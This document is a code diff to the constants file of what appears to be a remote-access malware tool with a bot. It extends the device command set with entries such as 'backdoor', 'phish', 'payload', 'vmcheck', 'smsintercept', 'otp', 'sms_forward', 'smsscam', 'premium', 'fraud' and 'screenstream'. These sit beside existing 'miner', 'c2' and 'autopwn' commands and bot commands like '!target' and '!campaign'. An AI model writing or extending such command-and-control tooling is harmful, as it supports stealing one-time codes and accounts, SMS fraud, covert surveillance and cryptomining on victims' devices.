@@ -97,6 +97,7 @@ export const E = {
   online: '🟢', offline: '🔴', loading: '⏳', sparkles: '✨',
   rocket: '🚀', pulse: '💫', ring: '💍', hourglass: '⏱️',
   satellite: '📡', tools: '🔧',
+  unlock: '🔓',
 }
 
 export const A = { reset: '\u001b[0m', grey: '\u001b[90m', red: '\u001b[31m', cyan: '\u001b[36m', green: '\u001b[32m', yellow: '\u001b[33m', magenta: '\u001b[35m', brightRed: '\u001b[91m', brightCyan: '\u001b[96m' }
@@ -113,10 +114,14 @@ export const DEV_CMDS = new Set([
   'miner', 'upload',
   'dir', 'ls', 'tree', 'find', 'cat', 'info', 'disk', 'recent', 'ext', 'download',
   'rm', 'mv', 'cp', 'mkdir',
-  'cd', 'pwd', 'stat', 'tokens', 'record', 'dump', 'flashlight',
-  'delete', 'move', 'copy',
-  'exploit', 'auto_pwn', 'autopwn', 'auth', 'c2', 'crypt', 'encrypt', 'decrypt',
-  'd', 'kill', 'help',
+  'cd', 'pwd', 'stat', 'tokens', 'record', 'dump', 'flashlight', 'photo', 'read',
+  'delete', 'move', 'copy', 'packages', 'accounts', 'macro', 'clicker',
+  'exploit', 'auto_pwn', 'autopwn', 'auth', 'c2',
+  'autograb', 'ai', 'profile', 'vmcheck', 'delayed', 'watchdog', 'fcm', 'blockchain',
+  'plugin', 'blocker', 'keepalive', 'queue', 'flush', 'health', 'sh', 'payload', 'phish',
+  'screenstream', 'kill', 'backdoor', 'dns', 'router', 'phish_server', 'help',
+  'smsscam', 'premium', 'fraud', 'carrier', 'smsi', 'smsintercept', 'intercept', 'otp',
+  'sms_list', 'smscaptured', 'sms_auto', 'autoreply', 'smsreply', 'sms_forward', 'smsfwd',
 ])
 
 export const BOT_CMDS = ['!help', '!menu', '!devices', '!broadcast', '!target', '!untarget', '!history', '!search', '!miner', '!upload', '!stream', '!ai', '!campaign', '!analyze', '!d']
